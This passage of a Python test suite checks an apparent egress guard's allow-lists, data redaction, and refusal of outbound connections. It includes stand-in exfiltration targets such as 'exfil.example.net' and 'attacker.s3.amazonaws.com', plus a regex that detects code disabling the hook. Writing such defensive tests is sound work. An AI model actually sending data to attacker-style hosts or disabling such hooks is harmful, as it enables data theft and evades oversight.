    msg = "worker ok\n2026-09-30 10:00:00 INFO warden.approvals: plan approved by owner"
    record = logging.LogRecord("t", logging.WARNING, __file__, 1, msg, None, None)
    _first, *rest = GatedFormatter("%(levelname)s %(message)s").format(record).split("\n")
    assert rest, rest
    assert all(line.startswith("    ") for line in rest), rest


def test_every_cli_command_and_the_mcp_server_gate_their_logs(monkeypatch):
    """Only `warden worker` installed the gate; every other command and the MCP server left
    Python's last-resort handler, which prints a warning's raw text."""
    import anyio
    import pytest

    from warden import cli, mcp_server, observability

    calls = []
    monkeypatch.setattr(observability, "install_log_gate", lambda level=None: calls.append(level))
    with pytest.raises(SystemExit):
        cli.main(["--help"])
    monkeypatch.setattr(anyio, "run", lambda fn: None)
    mcp_server.main()
    assert len(calls) == 2, calls



def test_the_log_gate_is_installed_once_even_after_a_module_reload():
    """Fourth review: after importlib.reload(warden.observability), the class check no longer saw the
    installed handler as the gate, a second was added, and every record went out twice."""
    import importlib
    import logging

    from warden import observability

    root = logging.getLogger()
    observability.install_log_gate()
    importlib.reload(observability)
    observability.install_log_gate()
    assert sum(getattr(h, "warden_log_gate", False) for h in root.handlers) == 1



def test_cutting_a_huge_single_token_is_fast_and_withholds_it():
    """Fourth review: `\\S*\\Z` backtracked quadratically - a 63,000-character token took 31 s, holding
    the logging handler's lock and stalling the worker."""
    import time

    from warden.observability import _redact_then_cut

    start = time.perf_counter()
    out = _redact_then_cut("x" * 70_000 + " tail", 8000)
    assert time.perf_counter() - start < 2, "the cut is quadratic again"
    assert "withheld" in out
    assert "xxxx" not in out
    assert _redact_then_cut("keep " + "y" * 70_000, 8000).startswith("keep")


# --------------------------------------------------------------------------- review round four (2026-10-21)

_SLACK_HOOK = "https://hooks.slack.com/"  # the path is added apart: a whole made-up webhook still reads as one

def test_aws_names_are_held_to_the_shapes_warden_uses(monkeypatch):
    """Review: `*.amazonaws.com` let any account's bucket, API Gateway, load balancer or instance in."""
    monkeypatch.setenv("WARDEN_AUDIT_ANCHOR_BUCKET", "warden-dev-anchors")
    monkeypatch.setenv("WARDEN_PAGES_BUCKET", "warden-dev-pages")
    for host in ("sts.amazonaws.com", "sts.ap-south-2.amazonaws.com", "kms.us-east-1.amazonaws.com",
                 "bedrock-runtime.us-east-1.amazonaws.com", "s3.ap-south-2.amazonaws.com",
                 "monitoring.cn-north-1.amazonaws.com.cn", "portal.sso.eu-west-1.amazonaws.com",
                 "warden-dev-anchors.s3.ap-south-2.amazonaws.com", "warden-dev-pages.s3.amazonaws.com",
                 "awslambda-ap-south-2-tasks.s3.ap-south-2.amazonaws.com",
                 "orders.cluster-ro-c1x2y3z4.ap-south-2.rds.amazonaws.com",
                 "master.carts-cache.abc123.aps2.cache.amazonaws.com",
                 "0123456789abcdef0123456789abcdef.gr7.ap-south-2.eks.amazonaws.com"):
        dest = egress.destination_of(host)
        assert dest is not None, host
        assert dest.name == "aws", host
    for host in ("attacker.s3.amazonaws.com", "attacker.s3.us-east-1.amazonaws.com", "a.b.s3-us-west-2.amazonaws.com",
                 "abc123.execute-api.us-east-1.amazonaws.com", "x-1.elb.amazonaws.com",
                 "ec2-3-4-5-6.compute-1.amazonaws.com", "search-x.us-east-1.es.amazonaws.com",
                 "site.s3-website-us-east-1.amazonaws.com", "awslambda-evil-tasks.s3.amazonaws.com"):
        assert egress.destination_of(host) is None, host
        with pytest.raises(EgressBlocked):
            egress.check_host(host)


def test_s3_addressed_path_style_reaches_only_wardens_own_buckets(monkeypatch):
    monkeypatch.setenv("WARDEN_AUDIT_ANCHOR_BUCKET", "warden-dev-anchors")
    with pytest.raises(EgressBlocked):
        egress.check_request("https://s3.ap-south-2.amazonaws.com/attacker-bucket/k", None, {}, "GET")
    egress.check_request("https://s3.ap-south-2.amazonaws.com/warden-dev-anchors/anchors/1.json", None, {}, "GET")


@pytest.mark.parametrize("url", [
    f"https://api.github.com/repos/{EMAIL}/issues",                          # the path
    "https://api.github.com/repos/o/r/issues/" + IP,                          # a path segment
    "https://" + EMAIL.replace("@", "%40") + ":x@api.github.com/user",        # the user name
    f"https://api.github.com/x#{EMAIL}",                                      # the fragment
])
def test_a_value_anywhere_in_the_url_is_refused(url):
    with pytest.raises(EgressBlocked):
        egress.check_request(url, None, {}, "GET")


def test_a_secret_paths_secret_part_is_not_scanned_but_its_first_segment_is():
    egress.check_request(_SLACK_HOOK + "services/T0AAAA/B0BBBB/" + "x" * 24,
                         json.dumps({"text": "fine"}).encode(), {"Content-Type": "application/json"}, "POST")


@pytest.mark.parametrize("encoding", ["gzip", "deflate", "br", "x-custom"])
def test_a_compressed_body_is_refused(encoding):
    """Review: a gzip body with an address in it was decoded as noise and passed."""
    import gzip

    body = gzip.compress(json.dumps({"text": f"user {EMAIL}"}).encode())
    with pytest.raises(EgressBlocked, match="cannot be checked"):
        egress.check_request(_SLACK_HOOK + "services/x", body,
                             {"Content-Type": "application/json", "Content-Encoding": encoding}, "POST")


def test_an_identity_encoded_body_is_checked_as_any():
    egress.check_request(_SLACK_HOOK + "services/x", json.dumps({"text": "fine"}).encode(),
                         {"Content-Type": "application/json", "Content-Encoding": "identity"}, "POST")


def test_a_credential_field_is_exempt_only_at_the_top_level():
    """Review: Slack's `code` anywhere in a message (a block's field) was left out of the scan."""
    nested = json.dumps({"blocks": [{"code": {"text": EMAIL}}]}).encode()
    with pytest.raises(EgressBlocked):
        egress.check_request("https://slack.com/api/chat.postMessage", nested, {"Content-Type": "application/json"}, "POST")
    egress.check_request("https://slack.com/api/oauth.v2.access", b"client_id=1.2&client_secret=" + b"s" * 32 +
                         b"&code=" + b"c" * 40, {"Content-Type": "application/x-www-form-urlencoded"}, "POST")


@pytest.mark.parametrize("address", ["2002:808:808::1", "2001:0:4136:e378:8000:63bf:3fff:fdd2", "100.64.0.1",
                                     "100.127.255.254"])
def test_relayed_and_shared_addresses_are_not_the_private_networks(address):
    """Review: 6to4 and Teredo reach the internet through public relays; 100.64.0.0/10 is a carrier's as often."""
    assert egress.destination_of(address) is None
    with pytest.raises(EgressBlocked):
        egress.check_connect((address, 443))


def test_a_shared_address_a_setting_names_exactly_is_reached(monkeypatch):
    monkeypatch.setenv("WARDEN_DB_DSN", "postgresql://warden@100.64.1.9:5432/warden")
    dest = egress.destination_of("100.64.1.9")
    assert dest is not None
    assert dest.name == "database"
    assert egress.destination_of("100.64.1.10") is None


def test_a_connection_to_an_address_needs_a_checked_lookup_first(monkeypatch):
    """Review: asyncio connects to an IP address with no lookup, so no lookup event was ever raised."""
    monkeypatch.setattr(egress, "_RESOLVED", set())
    with pytest.raises(EgressBlocked):
        egress.check_connect(("93.184.216.34", 443))
    egress.check_connect(("10.0.4.21", 5432))  # the private network's
    egress.check_connect("/tmp/s.sock")  # a Unix socket: not an internet address at all
    lookup = egress._resolving(lambda *_a: [(2, 1, 6, "", ("93.184.216.34", 443))], lambda r: (a[4][0] for a in r))
    lookup("api.github.com", 443)
    egress.check_connect(("93.184.216.34", 443))
    with pytest.raises(EgressBlocked):
        egress.check_connect(("exfil.example.net", 443))  # a name resolved inside connect(): checked as a lookup


_CONNECT = textwrap.dedent("""
    import asyncio, json, socket
    from warden import egress
    egress.install()
    out = {}
    def attempt(name, fn):
        try:
            fn()
            out[name] = "sent"
        except egress.EgressBlocked:
            out[name] = "blocked"
        except OSError as exc:
            out[name] = "network:" + type(exc).__name__
    async def opened(host, port):
        _r, w = await asyncio.wait_for(asyncio.open_connection(host, port), 2)
        w.close()
    def raw(host, port):
        with socket.socket() as s:
            s.settimeout(2)
            s.connect((host, port))
    attempt("asyncio_ip_literal", lambda: asyncio.run(opened("93.184.216.34", 9)))
    attempt("raw_ip_literal", lambda: raw("93.184.216.34", 9))
    attempt("asyncio_unlisted_name", lambda: asyncio.run(opened("exfil.example.net", 9)))
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen()
    port = srv.getsockname()[1]
    attempt("asyncio_loopback", lambda: asyncio.run(opened("127.0.0.1", port)))
    attempt("raw_localhost", lambda: raw("localhost", port))
    srv.close()
    print(json.dumps(out))
""")


def test_the_hook_refuses_a_connection_to_an_unlisted_address_in_a_real_interpreter():
    """asyncio.open_connection to an IP address, and a raw socket's connect: refused before any packet."""
    got = subprocess.run([sys.executable, "-c", _CONNECT], capture_output=True, text=True, timeout=60, check=True)
    out = json.loads(got.stdout.strip().splitlines()[-1])
    assert out["asyncio_ip_literal"] == "blocked"
    assert out["raw_ip_literal"] == "blocked"
    assert out["asyncio_unlisted_name"] == "blocked"
    assert out["asyncio_loopback"] == "sent"
    assert out["raw_localhost"] == "sent"


def test_nothing_in_src_turns_the_hook_off():
    """The hook's switch: only install() sets it, and only to True; nothing else in src/warden touches it, its
    re-entry guard or the audit hook itself (the test suite's conftest alone turns it back off between tests)."""
    switch = re.compile(r"_STATE\s*\[\s*[\"']on[\"']\s*\]\s*=|setitem\(\s*\w*_STATE|_STATE\.(?:update|clear|pop)"
                        r"|\.hooked\s*=|addaudithook")
    found = {}
    for path in SRC.rglob("*.py"):
        for no, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if switch.search(line):
                found[f"{path.relative_to(SRC)}:{no}"] = line.strip()
    assert sorted(v for v in found.values()) == sorted([
        'sys.addaudithook(_hook)', '_STATE["on"] = True',
        '_GUARD.hooked = True  # the ledger\'s own writes (the audit, KMS) pass the hook too, unchecked twice',
        '_GUARD.hooked = False']), found
    assert all(k.startswith("egress.py:") for k in found), found
    others = "".join(p.read_text(encoding="utf-8") for p in SRC.rglob("*.py") if p.name != "egress.py")
    assert not re.search(r"egress\._(?:STATE|GUARD|hook)\b", others)


def test_a_refusal_inside_a_model_sdk_is_not_retried():
    """Review: the SDK wraps the hook's refusal in its own connection error, which read as transient."""
    from warden import llm

    class APIConnectionError(Exception):
        pass

    try:
        try:
            raise EgressBlocked("an unlisted host", "it is on no destination")
        except EgressBlocked as inner:
            raise APIConnectionError("Connection error.") from inner
    except APIConnectionError as wrapped:
        assert llm._is_transient(wrapped) is False
        assert llm._provider_down(wrapped) == ""  # not an outage: the provider is not paged as down (#176)
        assert llm.failure_reason(wrapped) == llm.EGRESS_BLOCKED  # told apart from the model's own refusal
    assert llm._is_transient(APIConnectionError("Connection error.")) is True


def test_a_model_call_the_egress_check_refuses_is_recorded_as_egress_blocked_and_pages_nobody(caplog):
    """A blocked outbound call is a configuration or security event, not a model answer (owner, 2026-10-21): its
    fallback reason is egress_blocked, never model_refused, and it is no paging condition."""
    from pydantic import BaseModel

    from warden import llm, paging

    class _Answer(BaseModel):
        ok: bool

    class _Prompted:
        name, model, base_url = "anthropic", "claude-test", ""

        def complete(self, *, system, user, schema=None):  # never reached: the guard refuses first
            raise AssertionError("sent")

    egress.guard_provider(_Prompted)
    client = llm.LLMClient(provider=_Prompted(), max_usd=1.0, mock=False)
    caplog.set_level(logging.ERROR, logger="warden.llm")
    with pytest.raises(llm.ModelRefused):
        client.structured(system="s", user=f"user {EMAIL}", schema=_Answer)
    # Not a refused key (#185's B35 ERROR line pages at once): WARDEN's own check refused the call.
    assert not [r for r in caplog.records if r.name == "warden.llm" and r.levelno >= logging.ERROR]
    assert client.stopped_by == llm.EGRESS_BLOCKED
    assert llm.fallback_reason(client.stopped_by) == llm.EGRESS_BLOCKED
    assert llm.EGRESS_BLOCKED in llm.FALLBACK_REASONS
    assert llm.EGRESS_BLOCKED not in paging.MODEL_METRICS  # nobody is paged for it
    assert llm.failure_reason(EgressBlocked("anthropic", "the prompt is not fully masked")) == llm.EGRESS_BLOCKED


def test_an_egress_refusal_never_says_the_key_was_refused(caplog):
    """#185 says a 401/403 as an ERROR line that pages at once. An egress refusal - even inside an SDK error that
    carries a 403 - is egress_blocked, never that line."""
    from warden import llm

    class _Forbidden(Exception):
        status_code = 403

    caplog.set_level(logging.ERROR, logger="warden.llm")
    for refused in (EgressBlocked("anthropic", "the prompt is not fully masked"), _Forbidden("Forbidden")):
        refused.__cause__ = None if isinstance(refused, EgressBlocked) else EgressBlocked("anthropic", "refused")
        llm._say_if_key_refused(refused)
        assert llm.failure_reason(refused) == llm.EGRESS_BLOCKED
    assert not [r for r in caplog.records if r.name == "warden.llm"]
    llm._say_if_key_refused(_Forbidden("Forbidden"))  # a real refused key is still said
    assert [r.levelno for r in caplog.records if r.name == "warden.llm"] == [logging.ERROR]


# --------------------------------------------------------------------------- a structured body's digit-only values
GITHUB_DISPATCH = "https://api.github.com/repos/owner/repo/actions/workflows/deploy-dev.yml/dispatches"


@pytest.mark.parametrize("phone", ["+1 415 555 0100", "415-555-0100", "+14155550100"])
def test_a_phone_in_a_json_body_is_still_refused(phone):
    body = json.dumps({"ref": "dev", "inputs": {"note": phone}})
    with pytest.raises(EgressBlocked, match="PHONE"):
        egress.check_request(GITHUB_DISPATCH, body, JSON, "POST")


def test_a_digit_only_id_in_a_json_or_form_body_is_a_number_not_a_phone():
    egress.check_request(GITHUB_DISPATCH, json.dumps({"ref": "dev", "inputs": {"plan_run_id": "18234567890"}}), JSON,
                         "POST")
    egress.check_request(GITHUB_DISPATCH, "run=18234567890",
                         {"Content-Type": "application/x-www-form-urlencoded"}, "POST")


def test_a_digit_only_account_id_in_a_structured_body_is_still_refused():
    """The digit-only exemption drops only PHONE: a 12-digit account id to Slack (or anywhere) is still ACCOUNTID."""
    with pytest.raises(EgressBlocked, match="ACCOUNTID"):
        egress.check_request(SLACK_API, json.dumps({"x": "".join(str(d) for d in (1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2))}),
                             JSON, "POST")


def test_a_plain_text_body_is_still_scanned_whole_digits_included():
    with pytest.raises(EgressBlocked, match="PHONE"):
        egress.check_request(GITHUB_DISPATCH, "call 4155550100", {"Content-Type": "text/plain"}, "POST")


def test_the_infra_platforms_own_dispatch_passes_the_egress_check():
    """The exact request platforms/infra.py builds for an approved apply-plan (B17): its run id is digits only."""
    import io

    from warden.platforms.infra import ENTRY, GitHub, InfraPlatform

    head, sha, run_id = "a" * 40, "c" * 64, "18234567890"
    sent = []

    class _Answer(io.BytesIO):
        status = 204

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

    def opener(req, timeout):
        sent.append(req)
        if req.get_method() == "POST":
            return _Answer(b"")
        if "/branches/" in req.full_url:
            return _Answer(json.dumps({"commit": {"sha": head}}).encode())
        return _Answer(json.dumps({"workflow_runs": [
            {"id": int(run_id), "head_sha": head, "conclusion": "success",
             "display_title": "Deploy · dev · infra plan fullstack "}]}).encode())

    meta = {"commit": head, "sha256": sha, "stack": "fullstack", "environment": "dev"}
    p = InfraPlatform(environment="dev", github=GitHub("owner/repo", opener), plan_meta=lambda stack, run: meta,
                      token=lambda: "t" * 8, read_token=lambda: "")
    live = p.live(ENTRY, {"stack": "fullstack"})
    p.apply(ENTRY, {"stack": "fullstack", "plan_run": run_id, "plan_sha256": sha}, snapshot=live["state"],
            who={"approvers": ["owner"], "incident": "inc-1", "plan_hash": "d" * 64,
                 "run_id": "0b9e1c2a-1111-4222-8333-aaaabbbbcccc"})
    [dispatch] = [r for r in sent if r.get_method() == "POST"]
    assert run_id in dispatch.data.decode()
    for req in sent:  # the reads and the dispatch, each as urllib hands it to the egress hook
        egress.check_request(req.full_url, req.data, dict(req.header_items()), req.get_method())
